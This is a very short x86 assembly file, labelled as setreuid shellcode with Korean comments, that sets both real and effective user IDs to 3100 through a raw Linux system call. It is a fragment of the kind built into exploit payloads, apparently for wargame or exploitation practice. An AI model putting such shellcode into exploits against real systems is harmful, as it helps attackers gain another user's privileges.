; Author : superdk@hanmail.net
; DATA : setreuid shellcode
; LICENSE : GNU License


.globl _start
_start:

	mov $0xC1C, %bx 	; 인자(3100)를 레지스터에 저장
	mov $0xC1C, %cx 	; 인자(3100)를 레지스터에 저장
	xor %eax, %eax  	; EAX 레지스터 초기화
	movb $70, %al   	; setreuid( ) 함수 호출
	int $0x80